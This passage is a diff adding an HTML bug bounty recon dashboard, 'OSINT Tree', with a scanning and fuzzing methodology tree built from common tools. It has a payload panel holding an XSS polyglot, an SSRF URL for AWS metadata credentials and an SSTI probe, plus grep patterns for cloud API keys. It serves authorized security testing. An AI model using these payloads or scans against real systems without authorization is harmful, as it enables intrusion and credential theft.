@@ -1,0 +1,1240 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OSINT Tree v7.0 Pro — Advanced Bug Bounty & Recon Suite</title>
+  
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <!-- FontAwesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <!-- Google Fonts: JetBrains Mono & Inter -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            cyber: {
+              bg: '#07090e',
+              card: '#0f1420',
+              border: '#1e293b',
+              accent: '#10b981',
+              accentHover: '#059669',
+              blue: '#3b82f6',
+              purple: '#8b5cf6',
+              warning: '#f59e0b',
+              danger: '#ef4444',
+              text: '#e2e8f0',
+              muted: '#64748b'
+            }
+          },
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace']
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    body {
+      background-color: #07090e;
+      color: #e2e8f0;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .tree-node-children {
+      position: relative;
+      margin-left: 1.25rem;
+      padding-left: 1rem;
+      border-left: 1px dashed rgba(16, 185, 129, 0.3);
+      transition: all 0.2s ease-in-out;
+    }
+
+    .tree-node-item {
+      position: relative;
+    }
+
+    .tree-node-item::before {
+      content: "";
+      position: absolute;
+      top: 1.15rem;
+      left: -1rem;
+      width: 0.85rem;
+      height: 1px;
+      border-bottom: 1px dashed rgba(16, 185, 129, 0.3);
+    }
+
+    ::-webkit-scrollbar {
+      width: 8px;
+      height: 8px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #07090e;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #1e293b;
+      border-radius: 4px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #10b981;
+    }
+
+    .cmd-text::selection {
+      background: #10b981;
+      color: #000;
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col bg-cyber-bg text-cyber-text antialiased selection:bg-emerald-500 selection:text-black">
+
+  <!-- Top Navigation & Global Variables Bar -->
+  <header class="sticky top-0 z-50 bg-cyber-bg/95 backdrop-blur-md border-b border-cyber-border px-4 py-3 shadow-2xl">
+    <div class="max-w-[1440px] mx-auto flex flex-col gap-3">
+      
+      <!-- Top Row: Brand, Target Input, Search, Exports -->
+      <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-3">
+        <!-- Brand -->
+        <div class="flex items-center space-x-3">
+          <div class="w-10 h-10 rounded-lg bg-emerald-500/10 border border-emerald-500/40 flex items-center justify-center text-emerald-400 font-bold text-xl shadow-lg shadow-emerald-500/10">
+            <i class="fa-solid fa-terminal"></i>
+          </div>
+          <div>
+            <div class="flex items-center gap-2">
+              <h1 class="font-bold text-lg text-white tracking-wide">OSINT Tree</h1>
+              <span class="text-[11px] font-mono bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded border border-emerald-500/30 font-semibold">v7.0 PRO</span>
+            </div>
+            <p class="text-xs text-cyber-muted">Advanced Bug Bounty Recon, Offensive CLI & Engagement Tracker</p>
+          </div>
+        </div>
+
+        <!-- Primary Target Input & Global Search -->
+        <div class="flex flex-wrap items-center gap-2 flex-1 max-w-3xl">
+          <div class="flex items-center bg-cyber-card border border-cyber-border rounded-lg px-2.5 py-1.5 focus-within:border-emerald-500 transition flex-1 min-w-[220px]">
+            <span class="text-xs font-mono text-emerald-400 pr-2 font-semibold flex items-center gap-1.5">
+              <i class="fa-solid fa-crosshairs"></i> TARGET:
+            </span>
+            <input 
+              type="text" 
+              id="targetDomainInput" 
+              value="example.com" 
+              placeholder="e.g. target.com"
+              class="bg-transparent border-none text-white text-xs font-mono focus:outline-none w-full"
+              oninput="updateConfig()"
+            >
+            <button onclick="resetConfig()" title="Reset variables" class="text-xs text-cyber-muted hover:text-white px-1.5">
+              <i class="fa-solid fa-rotate-left"></i>
+            </button>
+          </div>
+
+          <!-- Search Filter -->
+          <div class="relative flex-1 min-w-[200px]">
+            <i class="fa-solid fa-magnifying-glass absolute left-3 top-2.5 text-cyber-muted text-xs"></i>
+            <input 
+              type="text" 
+              id="globalSearchInput" 
+              placeholder="Search tools, CVEs, commands, notes..." 
+              class="w-full bg-cyber-card border border-cyber-border rounded-lg pl-8 pr-3 py-1.5 text-xs text-white placeholder-cyber-muted focus:outline-none focus:border-emerald-500 transition"
+              oninput="applyFilters()"
+            >
+          </div>
+
+          <!-- Toggle Advanced Config Drawer -->
+          <button 
+            onclick="toggleAdvVars()" 
+            class="bg-cyber-card hover:bg-cyber-border text-xs font-mono text-slate-300 px-3 py-1.5 rounded-lg border border-cyber-border transition flex items-center gap-1.5"
+          >
+            <i class="fa-solid fa-sliders text-emerald-400"></i> CLI Vars
+          </button>
+        </div>
+
+        <!-- Export / Backup Controls -->
+        <div class="flex items-center gap-2 text-xs">
+          <button onclick="exportBashScript()" class="bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 px-2.5 py-1.5 rounded-lg font-mono transition flex items-center gap-1.5" title="Download Automated Recon .sh Script">
+            <i class="fa-solid fa-file-code"></i> .SH Script
+          </button>
+          <button onclick="exportMarkdownReport()" class="bg-blue-500/10 hover:bg-blue-500/20 text-blue-400 border border-blue-500/30 px-2.5 py-1.5 rounded-lg font-mono transition flex items-center gap-1.5" title="Export Markdown Engagement Report">
+            <i class="fa-brands fa-markdown"></i> Report
+          </button>
+          <button onclick="exportJsonState()" class="bg-cyber-card hover:bg-cyber-border text-slate-300 border border-cyber-border px-2.5 py-1.5 rounded-lg font-mono transition" title="Export JSON State Backup">
+            <i class="fa-solid fa-download"></i>
+          </button>
+          <label class="bg-cyber-card hover:bg-cyber-border text-slate-300 border border-cyber-border px-2.5 py-1.5 rounded-lg font-mono transition cursor-pointer" title="Import JSON State Backup">
+            <i class="fa-solid fa-upload"></i>
+            <input type="file" id="importJsonInput" accept=".json" class="hidden" onchange="importJsonState(event)">
+          </label>
+        </div>
+      </div>
+
+      <!-- Collapsible Advanced CLI Variables Drawer -->
+      <div id="advVarsDrawer" class="hidden grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5 pt-2 border-t border-cyber-border/60 text-xs font-mono">
+        <div class="flex items-center bg-cyber-card border border-cyber-border rounded px-2.5 py-1">
+          <span class="text-cyber-muted mr-2">WORDLIST:</span>
+          <input type="text" id="varWordlist" value="/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt" oninput="updateConfig()" class="bg-transparent text-amber-400 focus:outline-none w-full text-[11px]">
+        </div>
+        <div class="flex items-center bg-cyber-card border border-cyber-border rounded px-2.5 py-1">
+          <span class="text-cyber-muted mr-2">OOB HOST:</span>
+          <input type="text" id="varOob" value="oob.interact.sh" oninput="updateConfig()" class="bg-transparent text-purple-400 focus:outline-none w-full text-[11px]">
+        </div>
+        <div class="flex items-center bg-cyber-card border border-cyber-border rounded px-2.5 py-1">
+          <span class="text-cyber-muted mr-2">HEADER:</span>
+          <input type="text" id="varHeader" value="X-Bug-Bounty: HackerOne-Researcher" oninput="updateConfig()" class="bg-transparent text-blue-400 focus:outline-none w-full text-[11px]">
+        </div>
+        <div class="flex items-center bg-cyber-card border border-cyber-border rounded px-2.5 py-1">
+          <span class="text-cyber-muted mr-2">RATE/THREADS:</span>
+          <input type="text" id="varRate" value="50" oninput="updateConfig()" class="bg-transparent text-emerald-400 focus:outline-none w-full text-[11px]">
+        </div>
+      </div>
+
+      <!-- Secondary Toolbar: Progress Bar, Status Filters & Tree Actions -->
+      <div class="pt-2 border-t border-cyber-border/50 flex flex-wrap items-center justify-between gap-3 text-xs">
+        
+        <!-- Progress Bar & Flag Counter -->
+        <div class="flex items-center space-x-3 flex-1 min-w-[260px]">
+          <span class="text-cyber-muted font-mono font-medium">PROGRESS:</span>
+          <div class="flex-1 max-w-xs bg-cyber-card rounded-full h-2.5 border border-cyber-border overflow-hidden">
+            <div id="progressBar" class="bg-gradient-to-r from-emerald-600 to-emerald-400 h-full rounded-full transition-all duration-300 w-0"></div>
+          </div>
+          <span id="progressText" class="font-mono text-emerald-400 font-bold">0 / 0 (0%)</span>
+          <span id="flaggedCountBadge" class="font-mono text-[11px] bg-red-500/10 text-red-400 border border-red-500/30 px-2 py-0.5 rounded flex items-center gap-1">
+            <i class="fa-solid fa-flag"></i> 0 Flagged
+          </span>
+        </div>
+
+        <!-- Status Filter Pills -->
+        <div class="flex items-center space-x-1 bg-cyber-card p-1 rounded-lg border border-cyber-border font-mono text-[11px]">
+          <button onclick="setFilterMode('all')" id="flt-all" class="px-2.5 py-1 rounded bg-emerald-500 text-black font-semibold transition">All</button>
+          <button onclick="setFilterMode('todo')" id="flt-todo" class="px-2.5 py-1 rounded text-slate-300 hover:text-white transition">Todo</button>
+          <button onclick="setFilterMode('done')" id="flt-done" class="px-2.5 py-1 rounded text-slate-300 hover:text-white transition">Done</button>
+          <button onclick="setFilterMode('flagged')" id="flt-flagged" class="px-2.5 py-1 rounded text-red-400 hover:text-red-300 transition"><i class="fa-solid fa-fire mr-1"></i>Flagged</button>
+          <button onclick="setFilterMode('cli')" id="flt-cli" class="px-2.5 py-1 rounded text-blue-400 hover:text-blue-300 transition"><i class="fa-solid fa-terminal mr-1"></i>CLI Only</button>
+        </div>
+
+        <!-- Tree Collapse/Expand & Reset -->
+        <div class="flex items-center space-x-2">
+          <button onclick="expandAllNodes()" class="bg-cyber-card hover:bg-cyber-border text-slate-300 hover:text-white px-2.5 py-1.5 rounded border border-cyber-border transition flex items-center gap-1">
+            <i class="fa-solid fa-folder-open text-emerald-400"></i> Expand
+          </button>
+          <button onclick="collapseAllNodes()" class="bg-cyber-card hover:bg-cyber-border text-slate-300 hover:text-white px-2.5 py-1.5 rounded border border-cyber-border transition flex items-center gap-1">
+            <i class="fa-solid fa-folder text-amber-400"></i> Collapse
+          </button>
+          <button onclick="clearChecklistProgress()" class="bg-red-500/10 hover:bg-red-500/20 text-red-400 px-2.5 py-1.5 rounded border border-red-500/30 transition flex items-center gap-1">
+            <i class="fa-solid fa-trash-can"></i> Reset
+          </button>
+        </div>
+
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Workspace Layout -->
+  <main class="max-w-[1440px] mx-auto w-full flex-1 p-4 md:p-6 grid grid-cols-1 lg:grid-cols-12 gap-6">
+    
+    <!-- Left Column: Interactive OSINT & Pentest Methodology Tree -->
+    <section class="lg:col-span-8 bg-cyber-card/70 border border-cyber-border rounded-xl p-4 md:p-6 shadow-2xl backdrop-blur-sm flex flex-col">
+      <div class="flex items-center justify-between pb-4 mb-4 border-b border-cyber-border">
+        <div class="flex items-center space-x-2">
+          <i class="fa-solid fa-sitemap text-emerald-400 text-lg"></i>
+          <h2 class="font-semibold text-white tracking-wide">Offensive Methodology & Tool Tree</h2>
+        </div>
+        <span class="text-xs text-cyber-muted font-mono" id="treeStatusCount">Loading vectors...</span>
+      </div>
+
+      <!-- Dynamic Tree Container -->
+      <div id="treeContainer" class="space-y-2"></div>
+    </section>
+
+    <!-- Right Column: OSINT Launchpad, Automated Pipelines & Quick Payloads -->
+    <section class="lg:col-span-4 space-y-5">
+      
+      <!-- 1-Click External OSINT Recon Matrix -->
+      <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 shadow-xl">
+        <h3 class="text-xs font-semibold text-white uppercase tracking-wider mb-3 flex items-center justify-between border-b border-cyber-border pb-2">
+          <span class="flex items-center gap-2"><i class="fa-solid fa-satellite-dish text-emerald-400"></i> 1-Click OSINT Launchpad</span>
+          <span class="font-mono text-[11px] text-emerald-400" id="sidebarDomain">example.com</span>
+        </h3>
+        <div class="grid grid-cols-2 gap-2 text-xs font-mono">
+          <button onclick="openOsintLink('crtsh')" class="bg-cyber-bg hover:bg-cyber-border text-slate-200 p-2 rounded border border-cyber-border flex items-center gap-2 transition text-left">
+            <i class="fa-solid fa-certificate text-emerald-400"></i> crt.sh Certs
+          </button>
+          <button onclick="openOsintLink('shodan')" class="bg-cyber-bg hover:bg-cyber-border text-slate-200 p-2 rounded border border-cyber-border flex items-center gap-2 transition text-left">
+            <i class="fa-solid fa-server text-red-400"></i> Shodan Host
+          </button>
+          <button onclick="openOsintLink('wayback')" class="bg-cyber-bg hover:bg-cyber-border text-slate-200 p-2 rounded border border-cyber-border flex items-center gap-2 transition text-left">
+            <i class="fa-solid fa-clock-rotate-left text-blue-400"></i> Wayback URLs
+          </button>
+          <button onclick="openOsintLink('github')" class="bg-cyber-bg hover:bg-cyber-border text-slate-200 p-2 rounded border border-cyber-border flex items-center gap-2 transition text-left">
+            <i class="fa-brands fa-github text-purple-400"></i> GitHub Secrets
+          </button>
+          <button onclick="openOsintLink('censys')" class="bg-cyber-bg hover:bg-cyber-border text-slate-200 p-2 rounded border border-cyber-border flex items-center gap-2 transition text-left">
+            <i class="fa-solid fa-network-wired text-amber-400"></i> Censys SSL
+          </button>
+          <button onclick="openOsintLink('urlscan')" class="bg-cyber-bg hover:bg-cyber-border text-slate-200 p-2 rounded border border-cyber-border flex items-center gap-2 transition text-left">
+            <i class="fa-solid fa-magnifying-glass-Location text-emerald-400"></i> URLScan.io
+          </button>
+          <button onclick="openOsintLink('dork_files')" class="bg-cyber-bg hover:bg-cyber-border text-slate-200 p-2 rounded border border-cyber-border flex items-center gap-2 transition text-left">
+            <i class="fa-brands fa-google text-blue-400"></i> Exposed Docs
+          </button>
+          <button onclick="openOsintLink('dork_env')" class="bg-cyber-bg hover:bg-cyber-border text-slate-200 p-2 rounded border border-cyber-border flex items-center gap-2 transition text-left">
+            <i class="fa-solid fa-key text-amber-400"></i> Config / .env
+          </button>
+        </div>
+      </div>
+
+      <!-- Chained Recon Pipeline Generator -->
+      <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 shadow-xl">
+        <h3 class="text-xs font-semibold text-white uppercase tracking-wider mb-3 flex items-center gap-2 border-b border-cyber-border pb-2">
+          <i class="fa-solid fa-bolt text-amber-400"></i> Chained Recon One-Liners
+        </h3>
+
+        <div class="space-y-3">
+          <div>
+            <span class="text-[11px] text-cyber-muted font-mono block mb-1">1. Subdomains -> Resolve -> Live HTTP Tech & Nuclei:</span>
+            <div class="bg-cyber-bg p-2.5 rounded-lg border border-cyber-border">
+              <code id="pipe1Cmd" class="font-mono text-[11px] text-emerald-400 break-all block"></code>
+              <button onclick="copyCodeText('pipe1Cmd')" class="mt-2 w-full bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 font-mono text-[11px] py-1 rounded transition">
+                <i class="fa-regular fa-copy mr-1"></i> Copy Recon Pipeline
+              </button>
+            </div>
+          </div>
+
+          <div>
+            <span class="text-[11px] text-cyber-muted font-mono block mb-1">2. Archive URLs -> JS Endpoints -> XSS / Dalfox Scan:</span>
+            <div class="bg-cyber-bg p-2.5 rounded-lg border border-cyber-border">
+              <code id="pipe2Cmd" class="font-mono text-[11px] text-blue-400 break-all block"></code>
+              <button onclick="copyCodeText('pipe2Cmd')" class="mt-2 w-full bg-blue-500/10 hover:bg-blue-500/20 text-blue-400 border border-blue-500/30 font-mono text-[11px] py-1 rounded transition">
+                <i class="fa-regular fa-copy mr-1"></i> Copy XSS Pipeline
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rapid Bug Bounty Payload Reference -->
+      <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 shadow-xl">
+        <h3 class="text-xs font-semibold text-white uppercase tracking-wider mb-3 flex items-center gap-2 border-b border-cyber-border pb-2">
+          <i class="fa-solid fa-biohazard text-purple-400"></i> High-Signal Polyglots & Payloads
+        </h3>
+        <div class="space-y-2.5 text-[11px] font-mono">
+          <div class="bg-cyber-bg p-2 rounded border border-cyber-border flex items-center justify-between gap-2">
+            <div class="truncate">
+              <span class="text-purple-400 font-bold block">XSS Polyglot:</span>
+              <code class="text-slate-300" id="payXss">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//</code>
+            </div>
+            <button onclick="copyCodeText('payXss')" class="text-cyber-muted hover:text-white px-2 py-1 bg-cyber-card rounded border border-cyber-border"><i class="fa-regular fa-copy"></i></button>
+          </div>
+
+          <div class="bg-cyber-bg p-2 rounded border border-cyber-border flex items-center justify-between gap-2">
+            <div class="truncate">
+              <span class="text-amber-400 font-bold block">SSRF AWS IMDSv2 / Metadata:</span>
+              <code class="text-slate-300" id="paySsrf">http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>
+            </div>
+            <button onclick="copyCodeText('paySsrf')" class="text-cyber-muted hover:text-white px-2 py-1 bg-cyber-card rounded border border-cyber-border"><i class="fa-regular fa-copy"></i></button>
+          </div>
+
+          <div class="bg-cyber-bg p-2 rounded border border-cyber-border flex items-center justify-between gap-2">
+            <div class="truncate">
+              <span class="text-emerald-400 font-bold block">SSTI Polyglot Probe:</span>
+              <code class="text-slate-300" id="paySsti">${{<%[%'"}}%\.{{7*7}}</code>
+            </div>
+            <button onclick="copyCodeText('paySsti')" class="text-cyber-muted hover:text-white px-2 py-1 bg-cyber-card rounded border border-cyber-border"><i class="fa-regular fa-copy"></i></button>
+          </div>
+
+          <div class="bg-cyber-bg p-2 rounded border border-cyber-border flex items-center justify-between gap-2">
+            <div class="truncate">
+              <span class="text-blue-400 font-bold block">GraphQL Introspection Probe:</span>
+              <code class="text-slate-300" id="payGql">{"query":"{__schema{types{name,fields{name}}}}"}</code>
+            </div>
+            <button onclick="copyCodeText('payGql')" class="text-cyber-muted hover:text-white px-2 py-1 bg-cyber-card rounded border border-cyber-border"><i class="fa-regular fa-copy"></i></button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Engagement Scratchpad -->
+      <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 shadow-xl">
+        <h3 class="text-xs font-semibold text-white uppercase tracking-wider mb-2 flex items-center justify-between">
+          <span class="flex items-center gap-2"><i class="fa-solid fa-clipboard-list text-emerald-400"></i> Global Target Scratchpad</span>
+          <span class="text-[10px] text-cyber-muted font-mono">Auto-saved</span>
+        </h3>
+        <textarea 
+          id="globalScratchpad" 
+          rows="4" 
+          placeholder="Paste discovered credentials, ASN numbers, GraphQL endpoints, or scope exclusions here..."
+          oninput="saveGlobalScratchpad(this.value)"
+          class="w-full bg-cyber-bg border border-cyber-border rounded-lg p-2.5 text-xs font-mono text-slate-200 placeholder-cyber-muted focus:outline-none focus:border-emerald-500"
+        ></textarea>
+      </div>
+
+    </section>
+
+  </main>
+
+  <!-- Toast Notification -->
+  <div id="toast" class="fixed bottom-5 right-5 bg-emerald-500 text-black font-mono font-semibold text-xs px-4 py-2.5 rounded-lg shadow-2xl opacity-0 transform translate-y-4 transition-all duration-300 pointer-events-none flex items-center gap-2 z-50">
+    <i class="fa-solid fa-circle-check"></i>
+    <span id="toastMessage">Copied to clipboard!</span>
+  </div>
+
+  <script>
+    // Global Configuration & Persistent State
+    let config = {
+      domain: 'example.com',
+      wordlist: '/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt',
+      oob: 'oob.interact.sh',
+      header: 'X-Bug-Bounty: HackerOne-Researcher',
+      rate: '50'
+    };
+
+    let filterMode = 'all'; // all | todo | done | flagged | cli
+    let checklistState = {}; // { [id]: true/false }
+    let flaggedState = {};   // { [id]: true/false }
+    let notesState = {};     // { [id]: "string" }
+    let openNotes = {};      // { [id]: boolean }
+
+    // Expanded v7.0 Pro Methodology & Tool Tree (All Original v6.0 Nodes + Advanced Tooling)
+    const bugBountyTreeData = [
+      {
+        id: 'recon_wildcard',
+        title: 'Recon on Wildcard Domain & ASN Scope',
+        icon: 'fa-globe',
+        badge: 'Recon',
+        children: [
+          { id: 'asnmap', title: 'ASN & CIDR IP Range Discovery (asnmap / amass)', cmd: 'asnmap -d {domain} -silent | mapcidr -silent | tee cidr_{domain}.txt', desc: 'Map target organization ASN and expand into IPv4 CIDR ranges.' },
+          { id: 'uncover', title: 'Multi-Engine Passive Search (uncover)', cmd: 'uncover -q "{domain}" -e shodan,censys,fofa -silent | tee uncover_hosts.txt', desc: 'Query Shodan, Censys, and Fofa simultaneously via ProjectDiscovery uncover.' },
+          { id: 'amass', title: 'Run OWASP Amass (Active & Passive Enum)', cmd: 'amass enum -active -d {domain} -o amass_subs.txt', desc: 'Perform comprehensive network mapping and OSINT subdomain gathering.' },
+          { id: 'subfinder', title: 'Run Subfinder (Passive Sources)', cmd: 'subfinder -d {domain} -all -recursive -o subfinder_subs.txt', desc: 'Fast passive subdomain enumeration using all configured API keys.' },
+          { id: 'assetfinder', title: 'Run Assetfinder', cmd: 'assetfinder --subs-only {domain} | tee assetfinder_subs.txt', desc: 'Find domains and subdomains related to a given target.' },
+          { id: 'crtsh_cli', title: 'Certificate Transparency Logs (crt.sh JSON Parse)', cmd: 'curl -s "https://crt.sh/?q=%25.{domain}&output=json" | jq -r ".[].name_value" | sed "s/\\*\\.//g" | sort -u | tee crtsh_subs.txt', desc: 'Extract wildcard and historical subdomains directly from CT logs.' },
+          { id: 'puredns', title: 'Wildcard Filtering & Bruteforce (puredns)', cmd: 'puredns resolve subdomains.txt -r resolvers.txt --write resolved_valid.txt', desc: 'Filter out wildcard DNS poison and validate legitimate subdomains via massdns.' },
+          { id: 'alterx', title: 'Smart Subdomain Permutations (alterx + dnsx)', cmd: 'cat resolved_valid.txt | alterx -silent | dnsx -silent -o perm_subs.txt', desc: 'Generate dynamic cloud/dev/stage subdomain permutations and resolve them.' },
+          { id: 'dnsgen', title: 'Run dnsgen + massdns (Bulk Resolution)', cmd: 'cat subdomains.txt | dnsgen - | massdns -r resolvers.txt -o S -w dnsgen_resolved.txt', desc: 'Generate combinations of domain names based on input wordlists.' },
+          { id: 'naabu', title: 'Fast Port Enumeration (naabu)', cmd: 'naabu -list resolved_valid.txt -top-ports 1000 -rate {rate} -o open_ports.txt', desc: 'Discover non-standard web ports (8080, 8443, 8888, 9000) across all subdomains.' },
+          { id: 'httpx_probe', title: 'HTTP Tech & Status Probing (httpx)', cmd: 'httpx -l open_ports.txt -title -tech-detect -status-code -H "{header}" -threads {rate} -o httpx_alive.txt', desc: 'Modern replacement for httprobe with tech fingerprinting, status codes, and titles.' },
+          { id: 'httprobe', title: 'Use httprobe (Legacy Alive Hosts Probe)', cmd: 'cat subdomains.txt | httprobe -s -p https:443 | tee alive_hosts.txt', desc: 'Take a list of domains and probe for working HTTP and HTTPS servers.' },
+          { id: 'gowitness', title: 'Visual Recon Screenshots (gowitness / aquatone)', cmd: 'gowitness scan file -f httpx_alive.txt --threads 10 --write-db', desc: 'Capture headless Chromium screenshots across all live web services.' },
+          { id: 'subzy_takeover', title: 'Subdomain Takeover Audit (subzy + nuclei)', cmd: 'subzy run --targets resolved_valid.txt && nuclei -l httpx_alive.txt -t http/takeovers/ -H "{header}"', desc: 'Check dangling CNAMEs (GitHub, AWS S3, Azure, Heroku, Fastly) for takeover.' }
+        ]
+      },
+      {
+        id: 'single_domain',
+        title: 'Single Domain Deep Recon & Spidering',
+        icon: 'fa-crosshairs',
+        badge: 'Discovery',
+        children: [
+          {
+            id: 'single_scanning',
+            title: 'Active Scanning & Content Fuzzing',
+            icon: 'fa-radar',
+            children: [
+              { id: 'nmap_scan', title: 'Nmap Full Port & Script Scan', cmd: 'nmap -sC -sV -p- -T4 --min-rate 1000 -oA nmap_{domain} {domain}', desc: 'Full port, service version detection, and default NSE script scan.' },
+              { id: 'wafw00f', title: 'WAF & CDN Fingerprinting (wafw00f)', cmd: 'wafw00f https://{domain}', desc: 'Identify Cloudflare, Akamai, AWS WAF, or Imperva before heavy fuzzing.' },
+              { id: 'burp_crawler', title: 'Burp Suite Active Crawler', cmd: '# Open Burp Suite -> Target -> Site map -> Right-click https://{domain} -> Crawl', desc: 'Automated application spidering via Burp Suite proxy.' },
+              { id: 'ffuf_fuzzing', title: 'ffuf Directory & File Fuzzing', cmd: 'ffuf -u https://{domain}/FUZZ -w {wordlist} -H "{header}" -mc 200,204,301,302,307,401,403 -rate {rate} -ac', desc: 'Fast web directory & endpoint fuzzer with auto-calibration (-ac).' },
+              { id: 'feroxbuster', title: 'Recursive Content Discovery (feroxbuster)', cmd: 'feroxbuster -u https://{domain} -w {wordlist} -H "{header}" --rate-limit {rate} -x php,json,bak,env', desc: 'Recursive directory and backup extension bruteforcing.' },
+              { id: 'kiterunner', title: 'API Route Bruteforcing (kiterunner)', cmd: 'kr scan https://{domain} -w routes-large.kite -A=apiroutes-210228 -x 20', desc: 'Discover undocumented REST and GraphQL API endpoints.' },
+              { id: 'crawler_tools', title: 'Historical URLs (gau / waymore / hakrawler)', cmd: 'echo "{domain}" | gau --threads 10 | uro | httpx -silent -H "{header}" | tee urls_{domain}.txt', desc: 'Fetch known URLs from Wayback Machine, CommonCrawl, and OTX, deduplicated with uro.' },
+              { id: 'katana_js', title: 'Headless JS Crawler (katana)', cmd: 'katana -u https://{domain} -jc -hl -d 4 -H "{header}" -o katana_endpoints.txt', desc: 'Deep headless browser crawling and automatic JavaScript route parsing.' },
+              { id: 'linkfinder', title: 'LinkFinder & SecretFinder (JS Analysis)', cmd: 'python3 linkfinder.py -i https://{domain}/static/js/app.js -o cli && nuclei -l katana_endpoints.txt -t http/exposures/tokens/', desc: 'Extract hidden API paths, AWS keys, and tokens from JavaScript bundles.' },
+              { id: 'sourcemapper', title: 'Webpack Source Map Unpacking (sourcemapper)', cmd: 'sourcemapper -output ./src_{domain} -url https://{domain}/static/js/main.js.map', desc: 'Reconstruct original frontend TypeScript/React source code from exposed .map files.' },
+              { id: 'apk_url_extract', title: 'Android APK Endpoint & Secret Extraction', cmd: 'apktool d app.apk -o ./decompiled && grep -Eri "https?://.*{domain}|AIza|AKIA" ./decompiled', desc: 'Decompile mobile APK and search for hardcoded staging APIs and keys.' }
+            ]
+          },
+          {
+            id: 'single_manual',
+            title: 'OSINT & Leak Intelligence',
+            icon: 'fa-user-ninja',
+            children: [
+              { id: 'shodan', title: 'Shodan OSINT & Origin IP Search', cmd: 'shodan search "Ssl.cert.subject.CN:\'{domain}\' 200"', desc: 'Find origin servers bypassing Cloudflare via SSL certificate common names.' },
+              { id: 'censys', title: 'Censys Certificate & Service Inspection', cmd: 'censys search "services.tls.certificates.leaf_data.names: {domain}"', desc: 'Examine target SSL certificates for internal/hidden hosts.' },
+              { id: 'google_dorks', title: 'Google Dorks Exposure Discovery', cmd: 'site:{domain} (ext:pdf OR ext:xml OR ext:json OR ext:env OR ext:sql OR inurl:admin OR inurl:swagger)', desc: 'Use search operators to locate exposed documents, configs, and API docs.' },
+              { id: 'pastebin', title: 'Paste Sites & Breach Dump Search', cmd: 'site:pastebin.com OR site:jsfiddle.net OR site:postman.com "{domain}"', desc: 'Check public paste sites and Postman workspaces for leaked API collections.' },
+              { id: 'github_dorks', title: 'GitHub & GitLab Secret Recon (trufflehog)', cmd: 'trufflehog github --org={domain} --only-verified', desc: 'Scan target repositories and commit history for verified live credentials.' },
+              { id: 'osint_general', title: 'WHOIS, DNS & SPF/DMARC Footprinting', cmd: 'whois {domain} && dig +short ANY {domain} && dig +short TXT _dmarc.{domain}', desc: 'Gather registry WHOIS, DNS records, and check email spoofing protections.' }
+            ]
+          },
+          {
+            id: 'info_gathering',
+            title: 'Application Architecture & Parameter Mapping',
+            icon: 'fa-magnifying-glass-chart',
+            children: [
+              { id: 'info_manual_explore', title: 'Manually explore the application with Burp Proxy', desc: 'Walk through every user flow while populating Burp Target Site Map.' },
+              { id: 'info_spider_crawl', title: 'Spider/crawl for missed or orphaned content', cmd: 'katana -u https://{domain} -jc -kf all -d 3 -o katana_{domain}.txt', desc: 'Crawl for robots.txt, sitemap.xml, and deep paths.' },
+              { id: 'info_check_files', title: 'Check robots.txt, sitemap.xml, security.txt, .DS_Store', cmd: 'curl -s -L https://{domain}/robots.txt https://{domain}/sitemap.xml https://{domain}/.well-known/security.txt', desc: 'Inspect standard metadata and disclosure files.' },
+              { id: 'info_search_cache', title: 'Check search engine caches & Wayback archives', cmd: 'waybackurls {domain} | grep -E "\\.(json|xml|conf|bak|old|zip|sql)$"', desc: 'Locate deleted backup archives and config files in historical snapshots.' },
+              { id: 'info_user_agents', title: 'Check differential responses by User-Agent / Host', cmd: 'curl -s -L -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)" https://{domain} | wc -c', desc: 'Compare mobile, bot, and desktop responses.' },
+              { id: 'info_fingerprint', title: 'Web Application & Framework Fingerprinting', cmd: 'whatweb -a 3 https://{domain}', desc: 'Identify CMS, web server software, and framework versions.' },
+              { id: 'info_identify_tech', title: 'Identify backend stack & CVE surface (nuclei)', cmd: 'nuclei -u https://{domain} -tags tech,cve -H "{header}"', desc: 'Run technology detection and known CVE templates against target.' },
+              { id: 'info_user_roles', title: 'Map user roles & multi-tenant privilege tiers', desc: 'Document Admin, Manager, Editor, Read-Only, and Unauthenticated roles.' },
+              { id: 'info_entry_points', title: 'Identify all application entry points & headers', desc: 'Catalog GET/POST params, custom HTTP headers (X-Forwarded-For), and cookies.' },
+              { id: 'info_client_code', title: 'Audit client-side code & WebAssembly/JS bundles', desc: 'Inspect frontend scripts for client-side role checks or hidden admin routes.' },
